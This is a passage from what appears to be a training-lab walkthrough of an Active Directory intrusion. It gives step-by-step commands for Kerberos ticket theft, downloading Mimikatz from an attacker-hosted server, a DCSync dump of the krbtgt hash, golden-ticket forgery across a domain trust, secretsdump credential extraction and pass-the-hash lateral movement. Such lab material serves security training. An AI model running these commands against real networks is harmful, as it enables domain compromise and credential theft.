<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">Escalation to <span class="hljs-string">&quot;opsadmin&quot;</span> user:<br><span class="hljs-regexp">/𝑣𝑎𝑟/</span>𝑙𝑖𝑏<span class="hljs-regexp">/𝑗𝑒𝑛𝑘𝑖𝑛𝑠/</span>𝑓𝑖𝑛𝑑 𝑎𝑏 −𝑒𝑥𝑒𝑐 𝑐ℎ𝑚𝑜𝑑 <span class="hljs-number">777</span> 𝑠𝑢𝑝𝑝𝑜𝑟𝑡.𝑘𝑒𝑦𝑡𝑎𝑏 \;<br><br>Check the permissions of “support.keytab” <span class="hljs-keyword">file</span>:<br>𝑙𝑠 −𝑙𝑎 <span class="hljs-regexp">/𝑣𝑎𝑟/</span>𝑙𝑖𝑏<span class="hljs-regexp">/𝑗𝑒𝑛𝑘𝑖𝑛𝑠/</span>𝑠𝑢𝑝𝑝𝑜𝑟𝑡.𝑘𝑒𝑦𝑡𝑎𝑏<br><br>Request <span class="hljs-keyword">for</span> TGT of support user:<br>𝑘𝑖𝑛𝑖𝑡 −𝑘 −𝑡 𝑠𝑢𝑝𝑝𝑜𝑟𝑡.𝑘𝑒𝑦𝑡𝑎𝑏 𝑠𝑢𝑝𝑝𝑜𝑟𝑡<br></code></pre></div></td></tr></table></figure>

<p>Permissions of “<strong>support.keytab</strong>“ file is changed.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image21.png" srcset="/img/loading.gif"></p>
<p>Now, with enough permissions a TGT related to the “<strong>support</strong>“ domain user can be easily obtained. Let us now request a CIFS ticket for the “<strong>support</strong>“ user, as follows.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image22.jpeg" srcset="/img/loading.gif"></p>
<p>To request a CIFS ticket, use the following and export it back to your attacking machine.</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">Request <span class="hljs-keyword">for</span> CIFS Ticket <span class="hljs-keyword">for</span> support user (On OPS-SRV machine):<br>𝑘𝑣𝑛𝑜 𝑐𝑖𝑓𝑠/\𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷𝐷𝐶<br><br>Convert ticket <span class="hljs-keyword">into</span> base64 (On OPS-SRV machine):<br>𝑏𝑎𝑠𝑒<span class="hljs-number">64</span> <span class="hljs-regexp">/𝑡𝑚𝑝/</span>𝑘𝑟𝑏<span class="hljs-number">5</span>𝑐𝑐_123<br><br><span class="hljs-keyword">Copy</span> base64 data and decode in attacker system (On Attacker Machine):<br>𝑏𝑎𝑠𝑒<span class="hljs-number">64</span> −𝑑 𝑘𝑟𝑏<span class="hljs-number">5</span>𝑐𝑐_123_b64 &gt; <span class="hljs-regexp">/𝑡𝑚𝑝/</span>𝑘𝑟𝑏<span class="hljs-number">5</span>𝑐𝑐_123<br><br>Set Environment variable on attacker machine:<br>𝑒𝑥𝑝𝑜𝑟𝑡 𝐾𝑅𝐵<span class="hljs-number">5</span>𝐶𝐶𝑁𝐴𝑀𝐸=<span class="hljs-regexp">/𝑡𝑚𝑝/</span>𝑘𝑟𝑏<span class="hljs-number">5</span>𝑐𝑐_123<br></code></pre></div></td></tr></table></figure>

<p>Transferring the ticket using the base64 method and importing it to current environment variable.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image23.jpeg" srcset="/img/loading.gif"></p>
<ol>
<li> <strong>CHILD-DC Server</strong></li>
</ol>
<p>Since we have successfully imported a CIFS ticket related to ELS-CHILDDC in our attacking machine, we can connect to the “<strong>ELS-CHILDDC</strong>“ Domain Controller using the ticket. Also, our meterpreter has a route to the “<strong>10.10.2.0/24</strong>“ network.</p>
<p>For that we will use impacket’s psexec script, but first we need to add the IP address of ELS-CHILDDC in our hosts file.</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">Open /etc/hosts file:<br>10.10.2.2 𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷𝐷𝐶<br><br>Using Impacket’s psexec module, connect to ELS-CHILDDC<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑝𝑠𝑒𝑥𝑒𝑐. 𝑝𝑦 −𝑘 −𝑛𝑜−𝑝𝑎𝑠𝑠 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 10.10.2.2 𝑠𝑢𝑝𝑝𝑜𝑟𝑡@𝐸𝐿𝑆−𝐶𝐻𝐼𝐿𝐷𝐷𝐶<br><br><span class="hljs-symbol">NOTE: </span>‘-k’ option to use the active Kerberos ticket<br></code></pre></div></td></tr></table></figure>

<p>In short, we are passing the CIFS ticket to the ELS-CHILDDC server from our attacking machine.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image24.jpeg" srcset="/img/loading.gif"></p>
<p>This will result in a successful and stable session on the ‘<strong>ELS-CHILDDC</strong>‘ Domain Controller.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image25.png" srcset="/img/loading.gif"></p>
<p>We will also use the “<strong>PROD-SRV</strong>“ server to transfer payload from one end to another. Via the meterpreter session on the ‘PROD-SRV’ server upload “<strong>Mimikatz.exe</strong>“ and from that download the file to “<strong>ELS-CHILDDC”</strong> server.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">On PROD-SRV meterpreter session, upload Mimikatz.exe:<br>𝑢𝑝𝑙𝑜𝑎𝑑 𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒 <span class="hljs-regexp">/𝑡𝑚𝑝/</span>𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒<br><br>Start web server to host payload on PROD-SRV server<br>𝑠ℎ𝑒𝑙𝑙<br>𝑐𝑑 <span class="hljs-regexp">/𝑡𝑚𝑝/</span><br>𝑙𝑠 −𝑙𝑎 𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒<br>𝑝𝑦𝑡ℎ𝑜𝑛 −𝑚 𝑆𝑖𝑚𝑝𝑙𝑒𝐻𝑇𝑇𝑃𝑆𝑒𝑟𝑣𝑒𝑟 <span class="hljs-number">8888</span><br><br>With Active psexec session on ELS-CHILDDC, download the payload:<br>𝑝𝑜𝑤𝑒𝑟𝑠ℎ𝑒𝑙𝑙.𝑒𝑥𝑒 𝐼𝑛𝑣𝑜𝑘𝑒−𝑊𝑒𝑏𝑅𝑒𝑞𝑢𝑒𝑠𝑡 −𝑈𝑅𝐼 ℎ𝑡𝑡𝑝:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">250.2</span>:<span class="hljs-number">8888</span>/𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒 −𝑂𝑢𝑡𝐹𝑖𝑙𝑒 𝐶:\𝑈𝑠𝑒𝑟𝑠\𝑃𝑢𝑏𝑙𝑖𝑐\𝑚𝑖𝑚𝑖𝑘𝑎𝑡.𝑒𝑥𝑒<br></code></pre></div></td></tr></table></figure>

<p>Upload Mimikatz.exe:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image26.jpeg" srcset="/img/loading.gif"></p>
<p>Start Python server on “<strong>PROD-SRV</strong>“ server: -</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image27.png" srcset="/img/loading.gif"></p>
<p>Downloading, Mimikatz.exe on “<strong>ELS-CHILDDC</strong>“ Domain Controller.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image28.jpeg" srcset="/img/loading.gif"></p>
<p>Our payload is successfully transferred to Child Domain Controller. Now let us forge a golden ticket to escalate to Enterprise Admins of the parent domain.</p>
<p>However, we will need, the following:</p>
<ul>
<li><p>  Krbtgt hash of child DC</p>
</li>
<li><p>  Child Domin SID</p>
</li>
<li><p>  Parent Domain SID</p>
</li>
<li><p>  Current Domain FQDN</p>
</li>
</ul>
<p>To extract the krbtgt NTLM hash of the “<strong>els-childdc</strong>“ domain, we will perform a DCSync attack.</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">𝑚𝑖𝑚𝑖𝑘𝑎𝑡𝑧.𝑒𝑥𝑒<br>𝑙𝑠𝑎𝑑𝑢𝑚𝑝::𝑑𝑐𝑠𝑦𝑛𝑐 /𝑢𝑠𝑒𝑟:𝑒𝑙𝑠−𝑐ℎ𝑖𝑙𝑑\𝑘𝑟𝑏𝑡𝑔𝑡<br><br><span class="hljs-tag">&lt;<span class="hljs-name">Result</span>&gt;</span><br>𝟐𝟎𝟏𝟕𝒇𝟑𝟖𝒇𝟖𝟗𝟕𝒃𝟏𝟒𝟑𝟖𝒆𝟒𝟗𝟑𝒆𝟐𝒆𝒆𝟓𝟖𝒅𝒃𝟗𝟖𝒄𝟎<br><span class="hljs-tag">&lt;/<span class="hljs-name">Result</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>See below the extracted NTLM Hash of ‘krbtgt’ from the child domain controller. The SID of the child domain can be extracted from the result (without RID part).</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image29.png" srcset="/img/loading.gif"></p>
<p>To enumerate the parent SID value, we can use the Active Directory module already present at the domain controller.</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">In <span class="hljs-keyword">the</span> psexec session, <span class="hljs-keyword">switch</span> <span class="hljs-built_in">to</span> Power Shell:<br>𝑝𝑜𝑤𝑒𝑟𝑠ℎ𝑒𝑙𝑙<br>𝐼𝑚𝑝𝑜𝑟𝑡−𝑀𝑜𝑑𝑢𝑙𝑒 𝐴𝑐𝑡𝑖𝑣𝑒𝐷𝑖𝑟𝑒𝑐𝑡𝑜𝑟𝑦<br><br>Enumerate Domains present <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Forest (most importantly SID <span class="hljs-built_in">value</span> <span class="hljs-keyword">of</span> parent domain):<br>𝐺𝑒𝑡−𝐴𝐷𝐷𝑜𝑚𝑎𝑖𝑛<br>𝐺𝑒𝑡−𝐴𝐷𝐹𝑜𝑟𝑒𝑠𝑡<br>𝐺𝑒𝑡−𝐴𝐷𝐷𝑜𝑚𝑎𝑖𝑛 𝑒𝑙𝑠.𝑐𝑜𝑟𝑝 (𝑓𝑜𝑟 𝑠𝑖𝑑 𝑜𝑓 𝑒𝑙𝑠.𝑐𝑜𝑟𝑝)<br></code></pre></div></td></tr></table></figure>

<p>SID of Parent Domain Controller [<strong>els.corp</strong>] discovered:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image30.png" srcset="/img/loading.gif"></p>
<p>We have collected all the info needed to perform a golden ticket attack and cross the domain boundary. Let’s use Mimikatz.exe functionality to create and pass a golden ticket.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Create &amp; Pass Golden Ticket:<br>𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑠::𝑔𝑜𝑙𝑑𝑒𝑛 <span class="hljs-regexp">/𝑢𝑠𝑒𝑟:𝑒𝑙𝑠−𝑎𝑑𝑚𝑖𝑛 /</span>𝑑𝑜𝑚𝑎𝑖𝑛:𝑒𝑙𝑠−𝑐ℎ𝑖𝑙𝑑.𝑒𝑙𝑠.𝑐𝑜𝑟𝑝 <span class="hljs-regexp">/𝑠𝑖𝑑:𝑆−1−5−21−3883140795−789752816−1587902789 /</span>𝑘𝑟𝑏𝑡𝑔𝑡:𝟐𝟎𝟏𝟕𝒇𝟑𝟖𝒇𝟖𝟗𝟕𝒃𝟏𝟒𝟑𝟖𝒆𝟒𝟗𝟑𝒆𝟐𝒆𝒆𝟓𝟖𝒅𝒃𝟗𝟖𝒄𝟎 <span class="hljs-regexp">/𝑠𝑖𝑑𝑠:𝑆−1−5−21−286056459−1157968049−2884264478−519 /</span>𝑡𝑖𝑐𝑘𝑒𝑡:𝑡𝑖𝑐𝑘𝑒𝑡.𝑘𝑖𝑟𝑏𝑖<br><br>𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑠::𝑝𝑡𝑡 𝑡𝑖𝑐𝑘𝑒𝑡.𝑘𝑖𝑟𝑏𝑖<br></code></pre></div></td></tr></table></figure>

<p>Golden Ticket:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image31.jpeg" srcset="/img/loading.gif"></p>
<p>Passing the ticket in active Kerberos session:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image32.png" srcset="/img/loading.gif"></p>
<p>To check if the ticket is successfully passed or not, one can always use the ‘<strong>klist</strong>‘ command. Now, we can access resources of the parent domain and request any service ticket.</p>
<p>We will also extract the NTLM hash of the Enterprise Administrator of “<strong>els.corp</strong>“ domain (found previously during enumeration activities) using mimikatz.exe</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image33.png" srcset="/img/loading.gif"></p>
<ol>
<li> <strong>ELS-DC Server</strong></li>
</ol>
<p>With the credentials of “<strong>els-admin”</strong> enterprise admin, we can perform psexec on the parent DC server.</p>
<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">Perform</span> psexec <span class="hljs-literal">on</span> ELS-DC server:<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑝𝑠𝑒𝑥𝑒𝑐.𝑝𝑦 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 <span class="hljs-number">10.10.1.3</span> 𝑒𝑙𝑠−𝑎𝑑𝑚𝑖𝑛@𝐸𝐿𝑆−𝐷𝐶 −ℎ𝑎𝑠ℎ𝑒𝑠 𝑎𝑎𝑑<span class="hljs-number">3</span>𝑏<span class="hljs-number">435</span>𝑏<span class="hljs-number">51404</span>𝑒𝑒𝑎𝑎𝑑<span class="hljs-number">3</span>𝑏<span class="hljs-number">435</span>𝑏<span class="hljs-number">51404</span>𝑒𝑒:<span class="hljs-number">8645</span>𝑒<span class="hljs-number">87</span>𝑒<span class="hljs-number">2593507</span>𝑐𝑓<span class="hljs-number">623</span>𝑓<span class="hljs-number">3291</span>𝑏<span class="hljs-number">1334</span>𝑐<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure>

<p>“NT Authority\System” at “<strong>ELS-DC</strong>“ parent domain controller.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image34.png" srcset="/img/loading.gif"></p>
<p>Let’s now use the Active-Directory module to perform some enumeration (for abusing a cross-forest trust later on). Switch to PowerShell and load the AD module to enumerate a forest trust.</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Load</span> AD module &amp; <span class="hljs-keyword">perform</span> trust enumeration<br><br>𝐼𝑚𝑝𝑜𝑟𝑡−𝑀𝑜𝑑𝑢𝑙𝑒 𝐴𝑐𝑡𝑖𝑣𝑒𝐷𝑖𝑟𝑒𝑐𝑡𝑜𝑟𝑦<br>𝐺𝑒𝑡−𝐴𝐷𝑇𝑟𝑢𝑠𝑡 −𝐹𝑖𝑙𝑡𝑒𝑟 ∗<br></code></pre></div></td></tr></table></figure>

<p>Output of trust established by the “<strong>els.corp</strong>“ domain.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image35.png" srcset="/img/loading.gif"></p>
<p>Another domain “<strong>mgmt.corp</strong>“ having a bi-directional trust has been identified in the above result. A Foreign Security Principal can indirectly be used to abuse the cross-forest trust. Let’s enumerate FSP’s available on the identified domain “<strong>mgmt.corp</strong>“.</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Enumerate FSPs <span class="hljs-keyword">on</span> mgmt.corp <span class="hljs-keyword">domain</span><br>𝐺𝑒𝑡−𝐴𝐷𝑂𝑏𝑗𝑒𝑐𝑡 −𝐹𝑖𝑙𝑡𝑒𝑟 &#123;𝑜𝑏𝑗𝑒𝑐𝑡𝐶𝑙𝑎𝑠𝑠 −𝑒𝑞 &quot;𝑓𝑜𝑟𝑒𝑖𝑔𝑛𝑆𝑒𝑐𝑢𝑟𝑖𝑡𝑦𝑃𝑟𝑖𝑛𝑐𝑖𝑝𝑎𝑙&quot;&#125; −𝑠𝑒𝑟𝑣𝑒𝑟 𝑚𝑔𝑚𝑡.𝑐𝑜𝑟𝑝<br></code></pre></div></td></tr></table></figure>

<p>A Foreign Security Principal is available on the “<strong>mgmt.corp</strong>“ domain, this means a user in the current domain “<strong>els.corp</strong>“ is present in the target “<strong>mgmt.corp</strong>“ domain:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image36.png" srcset="/img/loading.gif"></p>
<p>Convert the identified user to SID:</p>
<figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns">Identify User:<br>𝐺𝑒𝑡−𝐴𝐷𝑈𝑠𝑒𝑟 −𝐹𝑖𝑙𝑡𝑒𝑟 ∗ |?&#123;$_.𝑆𝐼𝐷 −𝑒𝑞 ′𝑆−<span class="hljs-number">1</span>−<span class="hljs-number">5</span>−<span class="hljs-number">21</span>−<span class="hljs-number">286056459</span>−<span class="hljs-number">1157968049</span>−<span class="hljs-number">2884264478</span>−<span class="hljs-number">1107</span>′&#125;<br></code></pre></div></td></tr></table></figure>

<p>The foreign user can be identified as “<strong>forest_user</strong>“ of the <strong>els.corp</strong> domain:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image37.png" srcset="/img/loading.gif"></p>
<p>We need to identify the privileges of <strong>“forest_user”</strong> in the <strong>mgmt.corp</strong> domain.</p>
<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">Identify on which group ‘forest_user’ <span class="hljs-built_in">is</span> added <span class="hljs-built_in">at</span> mgmt.corp <span class="hljs-built_in">domain</span>:<br>𝐺𝑒𝑡−𝐴𝐷𝐺𝑟𝑜𝑢𝑝 −𝐹𝑖𝑙𝑡𝑒𝑟 ∗ −𝑃𝑟𝑜𝑝𝑒𝑟𝑡𝑖𝑒𝑠 𝑀𝑒𝑚𝑏𝑒𝑟 −𝑠𝑒𝑟𝑣𝑒𝑟 𝑚𝑔𝑚𝑡.𝑐𝑜𝑟𝑝 |?&#123;$<span class="hljs-symbol">_</span>.𝑀𝑒𝑚𝑏𝑒𝑟 −𝑚𝑎𝑡𝑐ℎ ′𝑆−<span class="hljs-number">1</span>−<span class="hljs-number">5</span>−<span class="hljs-number">21</span>−<span class="hljs-number">3658202825</span>−<span class="hljs-number">2428483480</span>−<span class="hljs-number">107650130</span>−<span class="hljs-number">1107</span>′&#125;<br></code></pre></div></td></tr></table></figure>

<p>It comes out that ‘<strong>forest_user</strong>‘ is added to local administrators of the ‘<strong>mgmt.corp</strong>‘ domain.</p>
<p>Now, we need to extract the credentials of ‘<strong>forest_user</strong>‘ and then we will perform PTH to the “<strong>mgmt.corp</strong>“ domain.</p>
<figure class="highlight gherkin"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gherkin">Run secretsdump against mgmt.corp domain:<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑠𝑒𝑐𝑟𝑒𝑡𝑠𝑑𝑢𝑚𝑝.𝑝𝑦 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 10.10.1.3 𝑒𝑙𝑠−𝑎𝑑𝑚𝑖𝑛<span class="hljs-meta">@𝐸𝐿𝑆−𝐷𝐶</span> −ℎ𝑎𝑠ℎ𝑒𝑠 𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:8645𝑒87𝑒2593507𝑐𝑓623𝑓3291𝑏1334𝑐2<br><br><span class="hljs-variable">&lt;Result&gt;</span><br>𝑒𝑙𝑠.𝑐𝑜𝑟𝑝\𝑓𝑜𝑟𝑒𝑠𝑡_𝑢𝑠𝑒𝑟:1107:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:𝑏7001𝑏2𝑑𝑏𝑒0𝑓𝑏𝑑𝑏𝑑62𝑒𝑒4𝑏3𝑏𝑑𝑒2410𝑏9<br><span class="hljs-variable">&lt;/Result&gt;</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image38.png" srcset="/img/loading.gif"></p>
<p>Credentials of <strong>“forest_user”</strong> are extracted as follows:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image39.png" srcset="/img/loading.gif"></p>
<p>We will now perform psexec against the ‘<strong>mgmt-DC</strong>‘ server. The IP address of <strong>mgmt.corp</strong> domain can be enumerated using a simple DNS query (i.e nslookup <strong>mgmt.corp</strong>).</p>
<ol>
<li> <strong>MGMT-DC Server</strong></li>
</ol>
<p>Using “<strong>forest_user”</strong> we can establish a persistent connection using impacket’s psexec script since it is a member of local administrators in the <strong>mgmt.corp</strong> domain.</p>
<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">Psexec <span class="hljs-keyword">as</span> ‘forest_user’ <span class="hljs-keyword">on</span> ‘mgmt.corp’ domain:<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑝𝑠𝑒𝑥𝑒𝑐.𝑝𝑦 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.2</span> 𝑓𝑜𝑟𝑒𝑠𝑡_𝑢𝑠𝑒𝑟@𝑀𝐺𝑀𝑇−𝐷𝐶 −ℎ𝑎𝑠ℎ𝑒𝑠 𝑎𝑎𝑑<span class="hljs-number">3</span>𝑏<span class="hljs-number">435</span>𝑏<span class="hljs-number">51404</span>𝑒𝑒𝑎𝑎𝑑<span class="hljs-number">3</span>𝑏<span class="hljs-number">435</span>𝑏<span class="hljs-number">51404</span>𝑒𝑒:𝑏<span class="hljs-number">7001</span>𝑏<span class="hljs-number">2</span>𝑑𝑏𝑒<span class="hljs-number">0</span>𝑓𝑏𝑑𝑏𝑑<span class="hljs-number">62</span>𝑒𝑒<span class="hljs-number">4</span>𝑏<span class="hljs-number">3</span>𝑏𝑑𝑒<span class="hljs-number">2410</span>𝑏<span class="hljs-number">9</span><br><br>Switch <span class="hljs-keyword">to</span> PowerShell<br></code></pre></div></td></tr></table></figure>

<p>You will see something similar to the below.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image40.png" srcset="/img/loading.gif"></p>
<p>We will also use the Active Directory Module present in the server to list any OU present in the MGMT-DC and all the members present in the available OU’s.</p>
<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">LIST <span class="hljs-keyword">all</span> OU’s in MGMT.CORP<br>𝐼𝑚𝑝𝑜𝑟𝑡−𝑀𝑜𝑑𝑢𝑙𝑒 𝐴𝑐𝑡𝑖𝑣𝑒𝐷𝑖𝑟𝑒𝑐𝑡𝑜𝑟𝑦<br>𝐺𝑒𝑡−𝐴𝐷𝑂𝑏𝑗𝑒𝑐𝑡 −𝐹𝑖𝑙𝑡𝑒𝑟 &#123;𝑂𝑏𝑗𝑒𝑐𝑡𝐶𝑙𝑎𝑠𝑠 −𝑒𝑞 ‘𝑜𝑟𝑔𝑎𝑛𝑖𝑧𝑎𝑡𝑖𝑜𝑛𝑎𝑙𝑢𝑛𝑖𝑡’&#125; −𝑃𝑟𝑜𝑝𝑒𝑟𝑡𝑖𝑒𝑠 𝐶𝑎𝑛𝑜𝑛𝑖𝑐𝑎𝑙𝑁𝑎𝑚𝑒 | 𝑆𝑒𝑙𝑒𝑐𝑡−𝑂𝑏𝑗𝑒𝑐𝑡 𝐷𝑖𝑠𝑡𝑖𝑛𝑔𝑢𝑖𝑠ℎ𝑒𝑑𝑁𝑎𝑚𝑒<br><br>Get Members of “Bastion-Host” OU<br><span class="hljs-symbol">$</span>𝑜𝑢𝑝𝑎𝑡ℎ = “𝑂𝑈=𝐵𝑎𝑠𝑡𝑖𝑜𝑛−𝐻𝑜𝑠𝑡,𝐷𝐶=𝑚𝑔𝑚𝑡,𝐷𝐶=𝑐𝑜𝑟𝑝”<br>𝐺𝑒𝑡−𝐴𝐷𝑈𝑠𝑒𝑟 −𝐹𝑖𝑙𝑡𝑒𝑟 ∗ −𝑆𝑒𝑎𝑟𝑐ℎ𝐵𝑎𝑠𝑒 <span class="hljs-symbol">$</span>𝑜𝑢𝑝𝑎𝑡ℎ<br>(𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛 𝑢𝑠𝑒𝑟 𝑑𝑖𝑠𝑐𝑜𝑣𝑒𝑟𝑒𝑑 )<br></code></pre></div></td></tr></table></figure>

<p>The Domain user “<strong>Jump-Admin</strong>“ present in the “<strong>Bastion-Host</strong>“ OU can be useful in moving forward from the MGMT-DC server. The IP address of “<strong>jump-srv”</strong> server can be enumerated by actively querying the DNS record.</p>
